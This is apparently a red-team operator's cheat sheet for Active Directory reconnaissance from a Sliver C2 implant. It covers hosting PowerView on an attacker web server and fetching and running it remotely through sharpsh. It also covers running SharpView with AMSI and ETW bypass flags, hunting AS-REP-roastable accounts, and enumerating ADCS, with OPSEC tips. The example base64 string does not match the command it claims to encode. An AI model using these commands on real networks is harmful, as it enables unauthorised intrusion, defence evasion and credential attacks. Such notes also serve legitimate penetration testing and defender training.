There are various methods to conduct domain reconaissance. Some commonly used tools and how their usage with sliver are explored below. See [[PowerView & SharpView]] as a quick reference for some cmdlets.
## PowerView
One method of domain reconnaissance is by utilizing `PowerView` and combining it with `sharpsh` and command encoding. 

Requirements:
	Host PowerView.ps1 on a http.server
	encoded powerview command
	`sharpsh` armory module

Example Usage
```bash
# Host PowerView.ps1 
python3 -m http.server <lport>

# Encode a PowerView command
echo -n "get-domainuser | select samaccountname,description" | base64
	# Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u

# Fire the command via sharpsh
sliver > sharpsh -- '-u http://<lhost>:<lport>/PowerView.ps1 -e -c <base64_string>'
```
## SharpView
SharpView is a .NET version of PowerView. This may used both via shellcode injection via `donut`, OR via `execute-assembly` using AMSI and ETW bypass options in Sliver.

> **NOTE:** Piping doesn't work here (it's not powershell...) See [[PowerView & SharpView]]

Example Usage
```bash
# Using execute-assembly
# Hunting for ASREP-roasting
sliver> execute-assembly /path/to/SharpView.exe "get-domainuser -PreauthNotRequired" -t 240 -i -E -M

	# -t <seconds> — timeout / max runtime before killed
	# -i — keep process interactive, or "ignore" AMSI/exit
	# -E — patch/bypass ETW
	# -M — patch/bypass AMSI (or "mask")

# Domain information
sliver > execute-assembly /path/to/SharpView.exe "get-domain" -t 240 -i -E -M 
```

Armory Module Version
```bash
sliver > sharpview -t 120 -- <powerview command>
```
## Misc
Sliver contains various coff loaders from [Outflank](https://github.com/sliverarmory/C2-Tool-Collection ) ported over as BOFs

Domain Info BOF
```bash
# Domain info BOF
sliver > c2tc-domaininfo
```

ADCS
```bash
# ADCS enumeration
sliver > certify -- find
# Alternative
sliver > execute -o certutil.exe     # Careful w/ execute (OPSEC)
```

Network Adapters
```bash
sliver > ifconfig   # utility of Sliver
```

If we can;t import modules of use binaries, we can rely on System.DirectoryServices namespace.
```bash
sliver > execute -o powershell $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest(); $Forest.Domains  # Carefule w/ this (OPSEC)... it spawns PS window
```